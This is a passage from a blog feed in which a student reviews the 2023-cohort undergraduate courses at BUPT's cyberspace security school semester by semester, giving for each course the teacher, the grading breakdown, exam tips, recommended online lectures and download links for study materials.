<p>用 <code>get_config()</code> 函数集中定义训练参数（如batch size、学习率、语言设置、模型文件名格式等）。</p>
<p>提供 <code>get_weights_file_path()</code> 和 <code>latest_weights_file_path()</code> 两个函数来<strong>动态生成模型权重文件的保存路径或加载路径</strong>，支持按照epoch命名和获取最新模型。</p>
<p>这个模块的设计非常适合用于训练循环中管理模型的保存和加载行为，是构建机器学习训练框架的重要一部分。</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>Trasformer</tag>
        <tag>AI</tag>
        <tag>扩展学习</tag>
      </tags>
  </entry>
  <entry>
    <title>北邮网安课程介绍（23级）</title>
    <url>/2026/01/25/%E5%8C%97%E9%82%AE%E7%BD%91%E5%AE%89%E5%A4%A7%E7%B1%BB%E8%AF%BE%E7%A8%8B%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于培养方案还在不断更改，每一届的同学所学课程的顺序，需要选修的课程都有可能发生变化，以下为2023级培养方案相关课程，内容仅供参考。</p>
<p>博客上的资料为百度网盘链接，相关资料也可以在github仓库里找到：<a href="https://github.com/Harrisonls2004/BUPT-SCSS-2023">https://github.com/Harrisonls2004/BUPT-SCSS-2023</a></p>
<p><strong>Tip</strong>: 如果链接过期请使用各种方式联系，我会在收到邮件的第一时间更新!</p>
<p>百度网盘链接已更新至每个科目后</p>
<h2 id="BUPT-SCSS-2023相关资料汇总"><a href="#BUPT-SCSS-2023相关资料汇总" class="headerlink" title="BUPT-SCSS-2023相关资料汇总"></a>BUPT-SCSS-2023相关资料汇总</h2><p>按照学期先后顺序排序，英语课、体育课、公选课在大三下后面。</p>
<h2 id="大一上"><a href="#大一上" class="headerlink" title="大一上"></a>大一上</h2><p>大一上的课比较少，难度也不是不大，多刷点题目基本就能拿高分。网安院分流只看第一学期成绩，只要不太差基本分流能随意选专业。</p>
<h3 id="大学生心理健康"><a href="#大学生心理健康" class="headerlink" title="大学生心理健康"></a>大学生心理健康</h3><p>杜玉春上的。一共4次课，有签到考勤，结课作业是一篇1000字以上的论文，水课，90分左右。</p>
<h3 id="计算导论与程序设计"><a href="#计算导论与程序设计" class="headerlink" title="计算导论与程序设计"></a>计算导论与程序设计</h3><p>邓小龙上的，讲的比较泛，课上学不到任何东西。</p>
<p>我们当时每个月都有一次上机考试，考了三次。上机考题一般5到6题编程函数题。期末考试也是上机考试，期末不仅有5~6题机考类型的题目，还有填空选择题。</p>
<p>平时会布置PTA习题，可以根据PTA习题考察点去复习。</p>
<p>上机考试占比很大，想拿高分的同学一定不要松懈。上机考试题目有可能会从历年试题里面出，学弟学妹们可以去CSDN或者从别的渠道找找历年考试题练习。</p>
<p>C语言推荐<strong>翁凯</strong>网课：<a href="https://www.bilibili.com/video/BV1csk1YkEes/?share_source=copy_web&vd_source=0cfbb11758fc5055bb1d48557ae8aa77">【翁凯C语言全集】浙大翁凯C语言入门到精通，c语言知识点全解析，c语言期末考试法宝100分！_哔哩哔哩_bilibili</a></p>
<p>相关资料：<a href="https://pan.baidu.com/s/1bWI-wnkS5a3CrwYh33JA2w?pwd=k68n">计导C语言</a></p>
<h3 id="网络空间安全导论"><a href="#网络空间安全导论" class="headerlink" title="网络空间安全导论"></a>网络空间安全导论</h3><p>谷利泽上的，老师讲得还行，<strong>平时20期中20期末60。</strong></p>
<p>当时只有谷老师有期中（随堂考试），但是24级开始全部都有期中考试了。考试很喜欢出历年原题，多写几套历年题容易考高分。</p>
<p>这门课以背诵为主，主要为网络空间安全相关基础概念内容，不算难，但是需要记的东西比较多，重点看课件中<strong>小结</strong>的部分。</p>
<p><strong>记得看概念名词英文缩写</strong>（当时我们考了10分，给个英文缩写，让你解释这个缩写的中文并写出缩写的全英文），当年学长没认真复习这个部分期考考了英文全称学长都不会~(⊙︿⊙)</p>
<p>相关资料：<a href="https://pan.baidu.com/s/14xVR-DGc8J11lN36n98gog?pwd=11yq">网安导论</a></p>
<h3 id="思想道德与法治"><a href="#思想道德与法治" class="headerlink" title="思想道德与法治"></a>思想道德与法治</h3><p>培养方案中共有思政、近代史、习概、马原、毛概五门思政课，四学期学完。</p>
<p>老师是巩姗姗。分数构成为<strong>期中论文20平时30期末50</strong>，期末开卷考试（准备好书）。</p>
<p>这门课由于开卷，期末笔试成绩基本无差距。（没必要平时花太多心思，期末考前看一遍目录知道章节即可）。</p>
<p>主要拉开差距的是平时分，想拿90＋请多多举手发言回答问题让老师记住你。如果你们老师有举手登记名字习惯那更好，思政课一般回答三次就是满分。</p>
<p>临近期末当时我们有课堂分享实践报告，课堂分享的同学都得到了平时分加分。</p>
<h3 id="高等数学A-上"><a href="#高等数学A-上" class="headerlink" title="高等数学A(上)"></a>高等数学A(上)</h3><p>23级最后一年学高数，24级开始改成6学分数分了。难度应该会上升一点，但是学习方法是差不多的，可以参考参考。</p>
<p>老师是刘晓楠，讲得还行。分数构成：<strong>平时20期中20期末60</strong>。每周都会有课后作业，不定期有课堂点名和课堂派扫码签到，按时交作业按时上课就行。期末考试难度不算大，题型比较固定，多写几套历年试题很容易拿90+高分。</p>
<p>平时有空建议去B站听宋浩老师的网课：<a href="https://www.bilibili.com/video/BV1Eb411u7Fw/?share_source=copy_web&vd_source=0cfbb11758fc5055bb1d48557ae8aa77">《高等数学》同济版 2024年更新|宋浩老师_哔哩哔哩_bilibili</a></p>
<p>期末考试重点：北邮李鹤老师习题课<a href="https://www.bilibili.com/video/BV14SAjesE6n/?share_source=copy_web">【邮理有李】2024级数分&#x2F;高数上期末复习_哔哩哔哩_bilibili</a></p>
<p>相关资料：<a href="https://pan.baidu.com/s/11ILexi6vN4RQ-oDz4qUbPg?pwd=2twf">高数A上</a></p>
<h3 id="线性代数"><a href="#线性代数" class="headerlink" title="线性代数"></a>线性代数</h3><p>我当时是胡越上的，老师水平很高，给分也很高。但是胡老师上课听的不是很懂，这门课基本都是个人自学。</p>
<p>分数构成是<strong>平时30期末70</strong>，每周都会布置作业，由于没有期中考试，作业的正确率对平时分也有影响，想拿高分请认真完成每次作业。</p>
<p>期末考试不算太难，题型也比较固定，<strong>速成很快</strong>。速成推荐：<a href="https://www.bilibili.com/video/BV1Wa4y1R7NC/?share_source=copy_web&vd_source=0cfbb11758fc5055bb1d48557ae8aa77">【线性代数】7小时快速通关_哔哩哔哩_bilibili</a>。平时有空建议平时看宋浩的课程。</p>
<p>相关资料：<a href="https://pan.baidu.com/s/1fPyDDlh-ayAkIKKYfPrZSg?pwd=jfij">线性代数</a></p>
<h3 id="四史课"><a href="#四史课" class="headerlink" title="四史课"></a>四史课</h3><p>中国党史、改革开放史、社会主义发展史、国史四选一。我选的是田凤娟老师的改革开放史。</p>
<p>平时每节课课前扫码签到，有一次小组汇报（汇报的都是满分），期末只用交一篇论文，给分挺好。</p>
<h3 id="形势与政策"><a href="#形势与政策" class="headerlink" title="形势与政策"></a>形势与政策</h3><p>前五学期每学期都有，最后都是交论文作业。得分都在90上下，不会很高。</p>
<p>23级123学期是每学期有三周的线下课，都会签到。45学期是雨课堂线上课。</p>
<h3 id="军事理论"><a href="#军事理论" class="headerlink" title="军事理论"></a>军事理论</h3><p>期末线上考试85%，有题库，全是原题。还有一篇论文作业15%。平时有签到但是我不太清楚有没有占比。</p>
<h3 id="军事训练"><a href="#军事训练" class="headerlink" title="军事训练"></a>军事训练</h3><p>两周，没什么意外就在沙河，每一级时间都不固定，23级是大一结束的暑假，24级是大一上入学，25级据说是大一下5月。</p>
<p>标兵一般有90+，正常都是85~90左右。评分一般是辅导员60分教官40分。</p>
<h2 id="大一下"><a href="#大一下" class="headerlink" title="大一下"></a>大一下</h2><p>课程非常多，学分将近达到30，一周都是课，非常累，好好准备考试，能拉开很大差距。</p>
<h3 id="数字逻辑与数字系统"><a href="#数字逻辑与数字系统" class="headerlink" title="数字逻辑与数字系统"></a>数字逻辑与数字系统</h3><p>张勖老师上的，讲得还行吧，每节课都有扫码签到（会计入平时分），但是老师给分不高。<strong>分数构成为平时10期中5实验25期末60</strong>。每次作业分数都影响平时分。第二周会布置了一个小组调研论文作业。</p>
<p>只有张老师的班是有期中考试的（随堂），王春露老师的班没有。期中考的有点难，当时60分以上的人不多。</p>
<p>实验有验收。验收就是现场老师从8个实验中抽一个让你当场做一遍。验收完成了这项25分就能拿满。</p>
<p>数电B站网课有很多，我当时混杂着听了几个，其实感觉不如自己看PPT。因为网课内容和课件有很大差距，有些东西的解释画图和北邮用的教材都不一样，建议备考复习以PPT和课本为主，网课仅供参考。期末考试我记得还涉及到了一些概念考察（好像这个考了25分左右），还有要作图的题。</p>
<p>相关资料：<a href="https://pan.baidu.com/s/1jkufvNzu960h5ko7Xekqjg?pwd=p7m3">数电</a></p>
<h3 id="C-高级语言程序设计"><a href="#C-高级语言程序设计" class="headerlink" title="C++高级语言程序设计"></a>C++高级语言程序设计</h3><p>这三门课开始放在一起说吧，C++大一下，JAVA大二上，Python大二下。24级开始和编译原理一起四选一了，但是建议别选编译原理。25级开始三门编程课全为大一下开课，我只选了Python。</p>
<p>C++这门课我没选，好像据说课程难度大，但是给分也还可以，学期中有小组作业，期末好像是手写代码。好像大作业做得好还有奖金。</p>
<h3 id="JAVA高级语言程序设计"><a href="#JAVA高级语言程序设计" class="headerlink" title="JAVA高级语言程序设计"></a>JAVA高级语言程序设计</h3><p>JAVA老师是伍淳华，我去听了一节课有点困就退课了。听选的同学说有五次上机实验，有期末闭卷考试，难度不小。</p>
<p><strong>22年期末</strong>：代码段分析题考设计面板中间有圆，可以改变圆的颜色，同时鼠标进入圆后改变颜色的代码实现；repaint（）引用的什么方法。（转自ZYH学长博客）</p>
<h3 id="Python高级语言程序设计"><a href="#Python高级语言程序设计" class="headerlink" title="Python高级语言程序设计"></a>Python高级语言程序设计</h3><p>老师是尚煜茗。这门课我当时是大二下学习。老师人很好，讲课感觉讲得也挺好的。有实验（大作业，2次，单人自己完成），平时作业（Python123平台，布置了四次）。<strong>期末60平时20两个个人大作业20。</strong>给分还行吧。</p>
<p>第一个大作业是正则表达式数据提取，不难，大概在第四节课讲完第二个月这样布置。<br>第二个大作业是网络爬虫，是按照学号最后一位数抽取题目，我比较不幸抽到了反爬机制比较强的今日头条。第二个大作业时间有点不太友好，是期末周布置的，时间比较紧，不知道之后老师会不会调整时间，但是还好只要做出来都是98或者100分。</p>
<p>期末考试<strong>是20道填空10道判断5道大题</strong>，前两道大题是概念解释：第一题是参数传递的类型判断和举例，第二题是硬拷贝，就是拷贝的区别。后三道大题是手写代码：第一个是文件有关，第二个是矩阵加法，第三个我有点忘了。手写代码比较折磨，不过还好，实在不会写至少写点东西上去，比如说中文？反正尽量别空着。</p>
<p>在后续的各种代码应用中python是用到最多的。脚本啊大作业啊科研啊基本都是用python的，我建议都选一下python，就算学过也可以选选巩固一下。</p>
<h3 id="网络空间安全导论实践"><a href="#网络空间安全导论实践" class="headerlink" title="网络空间安全导论实践"></a>网络空间安全导论实践</h3><p>王东滨上的，这课比较水，课上基本都是创新创业和一些网络安全法律，给分不是很高。</p>
<p>这门选修平时会布置几个实验，会给你步骤，就按着做然后写报告即可。</p>
<p>期末考核是个人大作业，自己从给定的题目里面选一个做，需要做PPT录视频最后课上5分钟展示，无期末考试。</p>
<p>相关资料：<a href="https://pan.baidu.com/s/1rE-jw9lo0QZ6xQ60q0iL3g?pwd=jjb5">网导实践</a></p>
<h3 id="离散数学"><a href="#离散数学" class="headerlink" title="离散数学"></a>离散数学</h3><p>我当时是郝杰上的，老师人很好，给分很高（只要正常学基本都是90+）。这门课虽然是双语教学（考试全英文题目），但是真的不难。分数构成是<strong>平时30期中10期末60</strong>。</p>
<p>平时作业的正确率会相应影响平时分，想拿高分的同学最高平时作业做全对。期中考试我们当时是十道大题，随堂的，考完过一周会发答题卡公布成绩。</p>
<p>日常跟着老师学就可以了，考试前一定要把老师PPT中每道习题弄明白。我们当时期中期末都考了不少PPT中的原题。这门课由于期末考试难度不大（10道选择10道填空若干道大题），很多同学分数很高，提前交卷的同学也很多。</p>
<p>相关资料：<a href="https://pan.baidu.com/s/1fux5L5VRc1ho2x5Qi24Tkw?pwd=bnw8">离散数学</a></p>
<h3 id="中国近现代史纲要"><a href="#中国近现代史纲要" class="headerlink" title="中国近现代史纲要"></a>中国近现代史纲要</h3><p>刘鑫（1-8周）、张飞雪（9-14周）上的，张老师有签到和随机点名。也是开卷考试，<strong>平时30展示20期末50。</strong>期中时候会有小组pre，平时分占比大，想拿高分建议平时多举手回答问题。</p>
<h3 id="习近平新时代中国特色社会主义思想概论"><a href="#习近平新时代中国特色社会主义思想概论" class="headerlink" title="习近平新时代中国特色社会主义思想概论"></a>习近平新时代中国特色社会主义思想概论</h3><p>和思政一样，也是巩姗姗老师上的。给分还行。成绩构成是<strong>平时20期中（论文报告）20实践20期末40（开卷）。</strong>临近期末有政协提案和课程相关主题展示（展示是自愿的，有加分）。</p>
<p><strong>注意听老师上课提到的考试要点</strong>，当时特意提到了<strong>新质生产力</strong>，但是书上没有这个内容，最后期末考了一道10分大题。</p>
<h3 id="高等数学A-下"><a href="#高等数学A-下" class="headerlink" title="高等数学A(下)"></a>高等数学A(下)</h3><p>高数的延续，好好学吧。</p>
<p>换成了江彦老师，老师讲课是手写的，讲得挺好的，期末前还有专门的习题答疑课。</p>
<p>平时分也是每节课的课后作业，占比和高数上一样，考核难度也不是很大。</p>
<p>相关资料：<a href="https://pan.baidu.com/s/1BQHiB0zawzNzMV45MOE4vQ?pwd=jnbq">高数A下</a></p>
<h3 id="大学物理"><a href="#大学物理" class="headerlink" title="大学物理"></a>大学物理</h3><p>我们当时叫大物C，好像24级开始改成大物D了，本质一样的一学期4学分。</p>
<p>刘尖斌上的，每节课都有扫码签到。分数构成<strong>平时30期中10期末60</strong>。期中我们当时是10道填空2道大题（每届都不一样，我们老师当时也没说改题型了，之前我们打听的消息都是4道25分大题）。这门课内容多难度大，一个学期4学分学完上下两本书（部分内容不学，老师开学会给范围）</p>
<p>大物前期都是力学电学，可以吃点老本比较简单，老师也讲得比较慢（考的也很基础）。但是到了后面学光学的时候没时间了，讲得很快（基本都是念PPT了），理解起来比较难（考的也很难）。</p>
<p>大物速成困难，想拿高分的同学我建议一定要预习，甚至老师一开始讲力学的时候你得开始学光学了。而且这门课很吃平时的练习，平时的题目不能少。一定要把课本和课件的例题全部吃透，因为可能有原题！（据24级反馈期末考试课本原题非常多）</p>
<p>相关资料：<a href="https://pan.baidu.com/s/163A0jajFD_b8h7-Y6fYRKQ?pwd=u9tw">大学物理</a></p>
<h3 id="物理实验A"><a href="#物理实验A" class="headerlink" title="物理实验A"></a>物理实验A</h3><p>赵红梅上的，这课要写很多实验报告，特别是预习报告，还需要上手操作。</p>
<p>有几个实验是现场考核的，这几个实验的评分是按完成实验的先后顺序来评定的。</p>
<p>考勤很严，不想做实验太累建议看实验视频预习（老师会发）。</p>
<p>最终分数是等级呈现，但也是有分数对应的，95（优），85（良），75（中），65，59五种。这门课是一个一个班上的，基本上优的同学每个班都有比例限制。</p>
<h2 id="大二上"><a href="#大二上" class="headerlink" title="大二上"></a>大二上</h2><p>大二上课程不是很多，但是有些课程学分较大，要好好学。网安比较能拉开差距的就是大一下和大二上了，之后很难再拉开差距了。</p>
<h3 id="网络空间安全认知实习"><a href="#网络空间安全认知实习" class="headerlink" title="网络空间安全认知实习"></a>网络空间安全认知实习</h3><p>小学期课程，据说24级改到大一下结束了。我们是苑洁上的，比较水。就是一个实验 + 网安相关调研报告。没什么难度。</p>
<h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><p>武斌上的。分数构成没有说（可能也是平时40期末60？），平时有PTA作业，手写代码作业，无期中，只有期末考试。</p>
<p>老师会进行报学号签到（签了四次，与平时分挂钩）</p>
<p>考试考代码并不是很多（也就一个10分的代码设计大题，我们考的是线性表相同元素删除？反正很简单，没有给情景），平时也没有机考。期末会给复习范围课件，一定要对着范围然后找到相应PPT每个知识点复习。</p>
<p>网课推荐：青岛大学王卓。<a href="https://www.bilibili.com/video/BV1nJ411V7bd/?share_source=copy_web&vd_source=0cfbb11758fc5055bb1d48557ae8aa77">数据结构与算法基础（青岛大学-王卓）_哔哩哔哩_bilibili</a></p>
<p>相关资料：<a href="https://pan.baidu.com/s/1QJEjO-uKVApUMb5zBte7ow?pwd=kgj8">数据结构</a></p>
<h3 id="计算机组成与系统结构"><a href="#计算机组成与系统结构" class="headerlink" title="计算机组成与系统结构"></a>计算机组成与系统结构</h3><p>这门课我觉得在所有课中最难了，非常让人头大，感觉很抽象，我是真没怎么学会。</p>
<p>理论部分老师是李小勇院长，实际上邱朋飞老师上课，期末考试是助教改的。分数构成：<strong>平时10期中10（期中考试开卷，一般只考大题）实验20期末60</strong></p>
<p>理论部分：平时有作业（我们布置了两次，课上交），我们班无签到（吕老师的班签了一次）。</p>
<p>如果想在北邮期末考试取得好成绩，可以听年级另外一位吕昕晨老师的网课，这个会比较贴合考题实际。如果时间不冲突，最好期末考试前最后一节课听听吕老师线下课，吕老师的课会透露一些出题方向（一般是他出题）。<a href="https://www.bilibili.com/video/BV1rS4y1174U/?share_source=copy_web&vd_source=0cfbb11758fc5055bb1d48557ae8aa77">计算机组成与系统结构-第一讲_哔哩哔哩_bilibili</a></p>
<p><strong>期中期末考试考原题的概率很大</strong>，当时期中考试第三道大题和22级考的一模一样。想办法找到历年真题也是获得好成绩的方法。</p>
<p>实验部分：学期中有四周会上实验课，实验课是苑洁老师上的。实验课使用实验箱。有四个实验，每个实验都要拍照，写实验报告。和数电一样，最后还需要验收，助教会从四个实验抽一个实验让你当场做。</p>
<p>相关资料：<a href="https://pan.baidu.com/s/168ifvl1gKkz6a0fT5VdEUg?pwd=bkuf">计组</a></p>
<h3 id="信息安全数学基础"><a href="#信息安全数学基础" class="headerlink" title="信息安全数学基础"></a>信息安全数学基础</h3><p>徐国胜上的。分数构成为<strong>平时40期末60</strong>，无期中。平时成绩主要是课堂练习（xgs才有，每次第三节课进行）和作业（正确率影响平时分的高低）。</p>
<p>这门课其实是上数论与近世代数。前半学期主要学数论，难度不是很大，一般理解起来不是很难，主要都是同余二次互反等计算。后半学期学近世代数，群环域，理解起来比较困难，也很抽象。</p>
<p>由于近世代数部分在期中之后开始上，内容多时间紧，老师上课讲不来这么多，都是以念PPT为主。最后近世代数内容考的不是很深，大多数也是考群的相关证明（我们当时这部分证明题只考了一道：两个正规子群的交集是正规子群）还有一些概念（比如叫你解释一下什么是整环，什么是域）。</p>
<p>信数期末考试会考15分概念解释，一定要牢记一些相关概念定义。一定要听复习课，老师当时提到的一些概念都考了。</p>
<p>相关资料：<a href="https://pan.baidu.com/s/1d_pTCL4wyp5V0hHUdr5NJA?pwd=x9an">信息安全数学基础</a></p>
<h3 id="信息安全心理学-社会工程学"><a href="#信息安全心理学-社会工程学" class="headerlink" title="信息安全心理学&#x2F;社会工程学"></a>信息安全心理学&#x2F;社会工程学</h3><p>辛阳上的，科普性课程，平时偶尔会签到。分数构成为<strong>平时40期末大作业60</strong>，给分很高。</p>
<p>平时多回答问题有加分，临近结课会安排课堂展示，我记得只要报名了就算没展示交了展示PPT也能加分。</p>
<p>大作业也很简单，就是叫你选一个黑客心理学的相关片段写论文介绍。</p>
<p>相关资料：<a href="https://pan.baidu.com/s/1t9PkgxFqgneKWS_QSx5pRQ?pwd=3wyx">社会工程学</a></p>
<h3 id="马克思主义基本原理"><a href="#马克思主义基本原理" class="headerlink" title="马克思主义基本原理"></a>马克思主义基本原理</h3><p>杨艳萍老师上的，老师说话很温柔。分数构成是<strong>平时30期中20期末50</strong>，但是这门课是<strong>闭卷</strong>。</p>
<p>平时成绩取决于考勤和课堂表现，每节课会随机点名考勤。平时成绩初始默认85分，回答一次问题加5分，回答三次即可拿平时分满分。回答问题后老师都会问学号记录。</p>
<p>期中是随堂开卷，老师会给几个题目让你自选1~2个来写作文，不难。</p>
<p>期末考试就是闭卷了，考哲学比较多（大题基本是哲学），背就完事了，不难的，能背完的。我们当时大家都是90+。</p>
<p>相关资料：<a href="https://pan.baidu.com/s/1jxtKq-FZfhjLX7ZSpCZFeA?pwd=vkf0">马原</a></p>
<h3 id="概率论与数理统计"><a href="#概率论与数理统计" class="headerlink" title="概率论与数理统计"></a>概率论与数理统计</h3><p>黎淑兰上的。分数构成：<strong>平时20论文20（期中不考试，写一篇与概率统计相关的论文）期末60</strong>。考试考的不难，考前多写几套练手就行，题型很固定。数理统计部分一些相关公式结论需要牢记。</p>
<p>网课推荐：宋浩，框框老师，李天意</p>
<p>相关资料：<a href="https://pan.baidu.com/s/1P_TD8JoMnCkARWhJox_bVQ?pwd=teyn">概率统计</a></p>
<h2 id="大二下"><a href="#大二下" class="headerlink" title="大二下"></a>大二下</h2><p>大二下专业课非常多，需要记忆的东西也很多，期末一堆考试。平时好好准备就行，期末就不会那么仓促。感觉大二下后期都在做实验。</p>
<h3 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h3><p>老师是李灵慧。<strong>期末60，平时作业和两个实验35，期中5</strong>。期中之后开始扫码签到，每次三节课都会扫码签到，全部都签了才算。</p>
<p>这门课考的深度确实不大，主要是要记的小概念非常多，小题拿分难（2分一题），大题主要都是计算题，不会像计网有概念解释。平时作业有对应的教材答案，很方便，直接参考就行。</p>
<p>实验有两个：一个是调研国产操作系统，一个是三选一大实验（有两个难度比较小，建议选Openeuler，可以参考很多资料，你也可以选择那个难度最大的手搓一个操作系统），实验只要单人完成所有要求并提交报告就是满分。</p>
<p>期中考试也是随堂，概念居多，不好拿分，大家当时分都不是很高。期末考试和期中考试题型差不多，题量略大于期中，会给小题大题范围，根据范围复习即可。我记得这门课一堆人提前交卷，难度应该不大，拿高分细致点吧。</p>
<p>推荐网课、刷题：王道。这门课的考试选择题全部从王道题目里面出，想拿高分最好刷完。<a href="https://www.bilibili.com/video/BV1YE411D7nH/?spm_id_from=333.337.search-card.all.click">王道计算机考研 操作系统_哔哩哔哩_bilibili</a></p>
<p>相关资料：<a href="https://pan.baidu.com/s/1CycbQAnxdDq5xqowsvaL7g?pwd=4q5d">操作系统</a></p>
<h3 id="计算机网络"><a href="#计算机网络" class="headerlink" title="计算机网络"></a>计算机网络</h3><p>老师是杨震。<strong>平时作业与实验45，期中考试5，期末考试50</strong>。</p>
<p>杨老师上课讲的挺好的，最后一节课还会带着复习，里面有考试重点。</p>
<p>平时作业每年基本一样，可以参考我们的思路，估计只会改一些数据。</p>
<p>这门课有两个实验：实验1不难，速通很快。实验2是两人一组设计socket编程，会有验收，也不算难。</p>
<p>期中考试随堂，10道大题，和往年期中考试题还有作业题很像。</p>
<p>期末考试有些许难度，难点在于客观题（选择20道、判断10道、填空10道）考的知识点非常细，如果要拿高分一定要吃透PPT上每个内容，但是大题我感觉很简单，多刷点题很容易写出来（有问题可以多问老师，他很乐意解答的）</p>
<p><strong>网课推荐中科大郑老师（和我们课件非常像，也是从上到下讲解）。</strong><a href="https://www.bilibili.com/video/BV1JV411t7ow/?spm_id_from=333.337.search-card.all.click">中科大郑烇、杨坚全套《计算机网络（自顶向下方法 第7版，James F.Kurose，Keith W.Ross）》课程_哔哩哔哩_bilibili</a></p>
<p><strong>王道的话可以参考，刷题可以用那个刷，但是王道是从下到上，和我们讲课顺序是反的。</strong></p>
<p>相关资料：<a href="https://pan.baidu.com/s/1kRqUvjmEySsy6HWtyBEhig?pwd=ads9">计网</a></p>
<h3 id="数据库技术与应用"><a href="#数据库技术与应用" class="headerlink" title="数据库技术与应用"></a>数据库技术与应用</h3><p>老师是肖达，<strong>平时成绩50（作业+实验），期末考试50</strong>。有实验，挺多的，课上课下都有。</p>
<p>平时多举手回答问题，或者报名讲作业题，都有额外加分。我们这届取消了期末额外的加分大实验，往年是有的，据说直接总分上加3~6分。</p>
<p>平时可以不听课，可以期末速成，但是建议期末前至少留有完整的两到三天速成。</p>
<p>网课推荐：<a href="https://www.bilibili.com/video/BV1Bq4y1Y7GC/?spm_id_from=333.337.search-card.all.click%EF%BC%88%E9%80%9F%E6%88%90%EF%BC%89">https://www.bilibili.com/video/BV1Bq4y1Y7GC/?spm_id_from&#x3D;333.337.search-card.all.click（速成）</a><a href="https://www.bilibili.com/video/BV1p1NoeTE89/?spm_id_from=333.337.search-card.all.click%EF%BC%88%E7%B3%BB%E7%BB%9F%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%9A%84%E7%BD%91%E8%AF%BE%EF%BC%89">https://www.bilibili.com/video/BV1p1NoeTE89/?spm_id_from&#x3D;333.337.search-card.all.click（系统性学习的网课）</a></p>
<p>相关资料：<a href="https://pan.baidu.com/s/15mbwgHSyJw2Rj6wa1GF5Qg?pwd=jmv6">数据库</a></p>
<h3 id="汇编语言与逆向工程"><a href="#汇编语言与逆向工程" class="headerlink" title="汇编语言与逆向工程"></a>汇编语言与逆向工程</h3><p>这门课是网安的典型专业课，好好学，可以掌握一项技能。</p>
<p>老师是付俊松。<strong>平时30</strong>（会随机点名上课回答问题，第七周上课最后全班点了一遍名），会布置三次逆向分析作业，不难。</p>
<p><strong>期末70</strong>，机考，五道题，并手写实验报告。（信安老师要求是写电子版报告，网安付老师要求是手写）。期末考试难度不大，题型非常固定，写完往年题基本能做出四道题，最后一题会有难度（但是别空着，把过程写清楚可以拿一半分的）</p>
<p>我觉得这门课的考试应对方法不是认真听付俊松讲课，而是考试前找一位网安的CTF大佬让他带着你做一遍历年的所有题目。</p>
<p>相关资料：<a href="https://pan.baidu.com/s/1JrneH-VOmlfECgiRjU7JwA?pwd=xnfp">逆向</a></p>
<h3 id="现代密码学"><a href="#现代密码学" class="headerlink" title="现代密码学"></a>现代密码学</h3><p>老师是毕经国。<strong>平时作业20，课堂测验25，课堂考勤5，期末考试50</strong>，认真复习上90不难。平时上课会有签到和随机点名回答问题。</p>
<p>这门课<strong>信安的郑老师和网安的毕老师上课内容差别很大，网安的同学想复习建议去听信安郑老师的网课</strong>，讲的比较好。</p>
<p>毕老师上课讲的很多内容考试不考，如果期末复习参考范围建议去找信安课件，不过我这也有。</p>
<p>我们这级密码学两个专业都取消期中考试了（每年情况都不同），往年一般是有的而且占比不少。我们课堂测验是开卷线上答题，基本大家都是满分。</p>
<p>期末考试考的难度没有预想的大，内容比较浅，也是偏向基本概念和基本计算，但是题量很大。建议最后一节课去信安听郑老师的复习课（网安的毕老师不会讲重点和范围），最后一节课点的内容基本都考了。</p>
<p><strong>郑老师网课链接</strong>：<a href="https://www.bilibili.com/video/BV1bi4y1k7ZC/?spm_id_from=333.337.search-card.all.click">现代密码学-第一周_哔哩哔哩_bilibili</a></p>
<p>相关资料：<a href="https://pan.baidu.com/s/1TOYBzdd6YmE0JjmhHcCseg?pwd=vg87">现代密码学</a></p>
<h3 id="毛泽东思想和中国特色社会主义理论体系概论"><a href="#毛泽东思想和中国特色社会主义理论体系概论" class="headerlink" title="毛泽东思想和中国特色社会主义理论体系概论"></a>毛泽东思想和中国特色社会主义理论体系概论</h3><p>老师是曲伟杰，讲课非常好。</p>
<p><strong>平时40</strong>：出勤4分，回答三次问题4分，小组课堂展示16分，随堂小测16分（其实我们当时就搞了一次，当考勤）</p>
<p><strong>期中20</strong>：（4到5人一组拍摄短视频。助教先在每个班的视频中筛出一半作为优胜小组，优胜小组此项至少获得19分并且视频在第七周进行课堂展示。未选上优胜小组此项分数在16到18分，第七周课上会选三个最佳作品获得此项满分20分）我们小组当时得了20分然后老师还让我们小组去参加了马院的微电影大赛。我感觉拍这个挺有意思的。</p>
<p><strong>期末40</strong>：（闭卷考试，会给大题范围，狠狠背就行了），相比马原很多都是背过的，不难，我留了10天左右背，背的考试全考了。</p>
<p>相关资料：<a href="https://pan.baidu.com/s/1Sz5SzfV4ncSsCOuCnIuBHw?pwd=d48y">毛概</a></p>
<h3 id="数学建模与模拟"><a href="#数学建模与模拟" class="headerlink" title="数学建模与模拟"></a>数学建模与模拟</h3><p>23级培养方案是数学建模、组合数学、复变函数三门课三选一。据说24级开始没有数学建模课程了，组合数学和复变函数无学分要求。当时我们基本都选数学建模，因为其他两门课都是闭卷期末考试，难度不小。</p>
<p>数学建模是贺祖国老师上的，这门课是三选一数学课中唯一不用期末考试的，比较轻松，给分挺好，推荐选择这门课。当时也是为了准备暑假培训想参加数学建模国赛然后选的。</p>
<p>期中有个北京高校数学建模校际联赛，建议去参加，老师说去的能加分，但是我感觉没加。</p>
<p>期末是倒数第二节课发题目一周时间线下自己完成最后一节课上交。</p>
<p>其他两门课也有同学去选，组合数学给分不如数学建模高。然后我们当时有同学数学比较厉害选复变函数的，老师给了100分。我觉得如果数学非常好，可以选择去刷分，要不就不要选了。</p>
<p>相关资料：<a href="https://pan.baidu.com/s/18-c-fs0ffldWO_QFsYb1YQ?pwd=kprk">数学建模</a></p>
<h3 id="大型程序设计实践"><a href="#大型程序设计实践" class="headerlink" title="大型程序设计实践"></a>大型程序设计实践</h3><p>大二下结束的小学期，我们是昌硕老师上的。就是开发一个平台，当时两个选题，一个是安全通讯还有一个是失物招领。我们是5个人。周一早上讲要求周五验收汇报，给分都很高。</p>
<h2 id="大三上"><a href="#大三上" class="headerlink" title="大三上"></a>大三上</h2><p>大三上极度痛苦，各种各样的课程实验基本没停过，从开学做到期末，事非常多。</p>
